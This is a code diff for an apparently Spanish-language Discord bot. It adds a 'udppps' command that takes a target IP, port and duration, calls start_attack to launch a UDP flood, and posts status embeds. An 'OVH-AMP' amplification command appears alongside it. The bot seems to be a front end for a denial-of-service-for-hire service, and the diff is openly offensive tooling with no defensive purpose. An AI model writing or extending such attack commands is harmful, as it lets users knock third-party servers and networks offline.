@@ -169,5 +169,17 @@ async def ovh_amp_cmd(ctx, ip: str, port: int, duration: int):
     embed = make_embed("💥 OVH-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
     await ctx.send(embed=embed)
 
+@bot.command(name='udppps')
+async def udppps_cmd(ctx, ip: str, port: int, duration: int):
+    from config import IMAGE_URLS
+
+    async def notify_end():
+        embed = make_embed("✅ UDPPPS terminado", "El ataque ha finalizado", IMAGE_URLS["attack"])
+        await ctx.send(embed=embed)
+
+    start_attack("udppps", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    embed = make_embed("💣 UDPPPS iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
+    await ctx.send(embed=embed)
+
 # Ejecutar el bot
 bot.run(token)
